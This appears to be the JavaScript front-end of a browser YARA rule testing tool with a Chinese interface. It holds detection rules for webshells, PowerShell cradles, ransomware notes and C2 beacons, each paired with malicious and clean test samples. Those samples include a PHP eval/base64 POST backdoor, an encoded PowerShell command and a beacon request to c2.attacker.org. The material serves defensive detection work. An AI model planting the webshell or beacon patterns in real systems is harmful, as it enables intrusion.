import * as scanner from "./wasm.js";

const TEMPLATES = {
  webshell: `rule Suspicious_Webshell {
    meta:
        description = "Detects PHP webshell execution patterns"
        severity = "critical"
    strings:
        $tag = "<?php" nocase
        $eval = "eval("
        $b64 = "base64_decode("
        $post = "$_POST["
    condition:
        $tag at 0 and ($eval or $b64) and $post
}`,
  xor: `rule XOR_Encoded_WinAPI_Stager : trojan obfuscation {
    meta:
        description = "Detects obfuscated payloads using single-byte XOR encoding on critical API strings"
        severity = "high"
    strings:
        $virtual_alloc = "VirtualAlloc" xor(0x01-0xff)
        $create_thread = "CreateThread" xor(0x01-0xff)
        $win_exec = "WinExec" xor(0x01-0xff)
    condition:
        any of them
}`,
  base64: `rule Base64_Embedded_Executable_Payload : dropper obfuscation {
    meta:
        description = "Detects Base64-encoded PE executable artifacts regardless of alignment"
        severity = "critical"
    strings:
        $pe_msg = "This program cannot be run in DOS mode" base64
        $bypass = "ExecutionPolicy Bypass" base64
    condition:
        any of them
}`,
  powershell: `rule Suspicious_PowerShell_Cradle {
    meta:
        description = "Detects obfuscated PowerShell download cradles"
        severity = "high"
    strings:
        $ps = /powershell(\.exe)?\s+(-(no)?p(rofile)?\s+)?-e(nc(odedcommand)?)?\s+[A-Za-z0-9+/=]+/ nocase
        $client = /New-Object\s+Net\.WebClient/ nocase
        $dl = /\.(DownloadString|DownloadFile)\s*\(\s*['"]https?:\/\// nocase
    condition:
        $ps or ($client and $dl)
}`,
  ransomware: `rule Ransomware_Note_Indicator {
    meta:
        description = "Detects extortion and ransom message keywords"
        severity = "critical"
    strings:
        $header = "All your files have been encrypted" nocase
        $btc = "bitcoin" nocase
        $onion = ".onion" nocase
    condition:
        $header and ($btc or $onion)
}`,
  c2: `rule C2_Beacon_HTTP_Traffic {
    meta:
        description = "Detects command & control HTTP beacon telemetry"
        severity = "critical"
    strings:
        $ua = /User-Agent:\s*(curl\/\d+\.\d+|python-requests\/\d+\.\d+)/ nocase
        $c2_uri = /GET\s+\/(api\/v[12]\/tasks|beacon\/heartbeat)\?[a-zA-Z0-9_=-]+/ nocase
    condition:
        $c2_uri and $ua
}`
};

function getXorVirtualAllocSample() {
  const raw = "VirtualAlloc";
  const key = 0x5a;
  let s = "\x90\x90\xeb\x10";
  for (let i = 0; i < raw.length; i++) {
    s += String.fromCharCode(raw.charCodeAt(i) ^ key);
  }
  s += "\xcc\xc3";
  return s;
}

const SAMPLES = {
  webshell_malicious: "<?php\n// Admin backdoor\n$data = $_POST['cmd'];\neval(base64_decode($data));\n?>",
  webshell_clean: "<?php\n// Standard application router\necho 'Welcome to production portal';\n?>",
  xor_malicious: getXorVirtualAllocSample(),
  xor_clean: "const harmless_buffer = new Uint8Array([0x00, 0x01, 0x02, 0x03, 0x04]);",
  base64_malicious: `# PowerShell Dropper Emulation
$stage2_blob = "UHJlZml4X1VucmVsYXRlZF9CeXRlc19UaGlzIHByb2dyYW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZV9TdWZmaXg=";
$decompressed = [System.Convert]::FromBase64String($stage2_blob);`,
  base64_clean: `# Clean developer script
$log_message = "Standard task queue scheduler initialized successfully.";`,
  powershell_malicious: "C:\\Windows\\system32\\cmd.exe /c powershell.exe -NoProfile -enc SQBFAFgAKABOAGUAdwA=",
  powershell_clean: "# PowerShell profile\nWrite-Host 'Welcome to administrative console'",
  ransomware_malicious: "ATTENTION!\nAll your files have been encrypted by RSA-4096.\nSend 0.5 bitcoin to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\nOr visit our darknet portal at decrypt7x2y4z.onion",
  ransomware_clean: "System backup completed successfully at 2026-09-17 12:00:00. 100% integrity verified.",
  c2_malicious: "GET /api/v1/tasks?node=host-889 HTTP/1.1\r\nHost: c2.attacker.org\r\nUser-Agent: python-requests/2.28\r\n\r\n",
  c2_clean: "GET /healthz HTTP/1.1\r\nHost: internal-service.local\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\r\n"
};

const ruleInput = document.getElementById("ruleInput");
const sampleInput = document.getElementById("sampleInput");
const reportOutput = document.getElementById("reportOutput");
const matchSummary = document.getElementById("matchSummary");
const engineStatus = document.getElementById("engineStatus");
const templateSelect = document.getElementById("ruleTemplateSelect");
const validateBtn = document.getElementById("validateBtn");
const scanBtn = document.getElementById("scanBtn");
const dropZone = document.getElementById("dropZone");

function updateTemplateSelection(key) {
  if (TEMPLATES[key]) {
    templateSelect.value = key;
    ruleInput.value = TEMPLATES[key];
    const malKey = `${key}_malicious`;
    if (SAMPLES[malKey]) {
      sampleInput.value = SAMPLES[malKey];
    } else {
      sampleInput.value = SAMPLES.webshell_malicious;
    }
  }
}

// Check query param e.g. ?t=xor
const urlParams = new URLSearchParams(window.location.search);
const initialTemplate = urlParams.get("t") || "webshell";
updateTemplateSelection(initialTemplate);

templateSelect.addEventListener("change", (e) => {
  updateTemplateSelection(e.target.value);
});

document.getElementById("loadMaliciousSample").addEventListener("click", () => {
  const key = templateSelect.value;
  const malKey = `${key}_malicious`;
  if (SAMPLES[malKey]) {
    sampleInput.value = SAMPLES[malKey];
  } else {
    sampleInput.value = SAMPLES.webshell_malicious;
  }
});

document.getElementById("loadCleanSample").addEventListener("click", () => {
  const key = templateSelect.value;
  const cleanKey = `${key}_clean`;
  if (SAMPLES[cleanKey]) {
    sampleInput.value = SAMPLES[cleanKey];
  } else {
    sampleInput.value = SAMPLES.webshell_clean;
  }
});

validateBtn.addEventListener("click", () => {
  try {
    const count = scanner.check_rule_syntax(ruleInput.value);
    if (count >= 0) {
      alert(`[+] 规则语法校验成功：成功解析 ${count} 条规则。`);
    } else {
      alert("[-] 规则语法错误，请检查语法规则。");
    }
  } catch (err) {
    alert("[-] 校验异常: " + err);
  }
});

function renderHexDump(bytes, matchedRanges) {
  const container = document.getElementById("hexDumpContainer");
  const hexMeta = document.getElementById("hexMeta");
  container.innerHTML = "";

  if (bytes.length === 0) {
    container.innerHTML = '<div class="hex-dump-placeholder">待测目标数据为空</div>';
    hexMeta.textContent = "0 字节";
    return;
  }

  hexMeta.textContent = `总计 ${bytes.length} 字节 | 命中区间: ${matchedRanges.length} 个`;

  const fragment = document.createDocumentFragment();
  const chunkSize = 16;
  const maxBytes = Math.min(bytes.length, 4096); // limit preview to first 4KB for responsive rendering

  for (let i = 0; i < maxBytes; i += chunkSize) {
    const row = document.createElement("div");
    row.className = "hex-row";

    const offsetEl = document.createElement("span");
    offsetEl.className = "hex-offset";
    offsetEl.textContent = "0x" + i.toString(16).padStart(8, "0");
    row.appendChild(offsetEl);

    const bytesEl = document.createElement("div");
    bytesEl.className = "hex-bytes";

    const asciiEl = document.createElement("span");
    asciiEl.className = "hex-ascii";

    for (let j = 0; j < chunkSize; j++) {
      const idx = i + j;
      if (idx < maxBytes) {
        const b = bytes[idx];
        const isMatched = matchedRanges.some(r => idx >= r.start && idx < r.end);

        const byteSpan = document.createElement("span");
        byteSpan.className = "hex-byte" + (isMatched ? " matched" : "");
        byteSpan.textContent = b.toString(16).padStart(2, "0").toUpperCase();
        bytesEl.appendChild(byteSpan);

        const asciiSpan = document.createElement("span");
        asciiSpan.className = isMatched ? "hex-ascii-char matched" : "hex-ascii-char";
        const char = (b >= 32 && b <= 126) ? String.fromCharCode(b) : ".";
        asciiSpan.textContent = char;
        asciiEl.appendChild(asciiSpan);
      } else {
        const byteSpan = document.createElement("span");
        byteSpan.className = "hex-byte";
        byteSpan.textContent = "  ";
        bytesEl.appendChild(byteSpan);
      }
    }

    row.appendChild(bytesEl);
    row.appendChild(asciiEl);
    fragment.appendChild(row);
  }

  if (bytes.length > maxBytes) {
    const notice = document.createElement("div");
    notice.style.color = "#8b949e";
    notice.style.padding = "8px";
    notice.style.textAlign = "center";
    notice.textContent = `... 已截断显示（显示前 ${maxBytes} 字节，总计 ${bytes.length} 字节）`;
    fragment.appendChild(notice);
  }

  container.appendChild(fragment);
}

scanBtn.addEventListener("click", () => {
  const ruleSrc = ruleInput.value;
  const sampleText = sampleInput.value;

  try {
    const jsonStr = scanner.scan_text_to_json(ruleSrc, sampleText);
    const report = JSON.parse(jsonStr);

    if (report.error) {
      reportOutput.textContent = "[!] 规则编译失败:\n" + report.error;
      matchSummary.textContent = "编译错误";
      matchSummary.style.color = "#f85149";
      return;
    }

    // Convert string to bytes for hex dump inspection
    const bytes = new Uint8Array(new TextEncoder().encode(sampleText));
    const matchedRanges = [];

    if (report.matches_count > 0) {
      matchSummary.textContent = `命中 ${report.matches_count} 条规则`;
      matchSummary.style.color = "#f85149";
      let formatted = `=================== 扫描报告 ===================\n`;
      formatted += `扫描数据大小: ${report.size} 字节\n`;
      formatted += `命中规则总数: ${report.matches_count}\n\n`;

      for (const m of report.matches) {
        formatted += `[!] 命中规则: ${m.rule}\n`;
        if (m.tags && m.tags.length > 0) {
          formatted += `    标签: ${m.tags.join(", ")}\n`;
        }
        formatted += `    匹配特征:\n`;
        for (const s of m.strings) {
          formatted += `      - 标识: ${s.id} | 偏移量: ${s.offset} | 匹配长度: ${s.length}\n`;
          matchedRanges.push({ start: s.offset, end: s.offset + s.length });
        }
        formatted += "\n";
      }

      reportOutput.textContent = formatted;
    } else {
      matchSummary.textContent = "未匹配到规则";
      matchSummary.style.color = "#3fb950";
      reportOutput.textContent = `[+] 扫描完成：目标数据 (${report.size} 字节) 未命中任何规则。`;
    }

    renderHexDump(bytes, matchedRanges);
  } catch (err) {
    reportOutput.textContent = "扫描执行异常: " + err;
  }
});

// Drag & Drop handler for local offline file inspection
dropZone.addEventListener("dragover", (e) => {
  e.preventDefault();
  dropZone.classList.add("dragover");
});

dropZone.addEventListener("dragleave", () => {
  dropZone.classList.remove("dragover");
});

dropZone.addEventListener("drop", (e) => {
  e.preventDefault();
  dropZone.classList.remove("dragover");

  const files = e.dataTransfer.files;
  if (files.length > 0) {
    const file = files[0];
    const reader = new FileReader();
    reader.onload = (event) => {
      sampleInput.value = event.target.result;
      dropZone.textContent = `已载入本地文件: ${file.name} (${file.size} 字节)`;
    };
    reader.readAsText(file);
  }
});

// Auto-trigger initial scan for instant visual presentation
scanBtn.click();

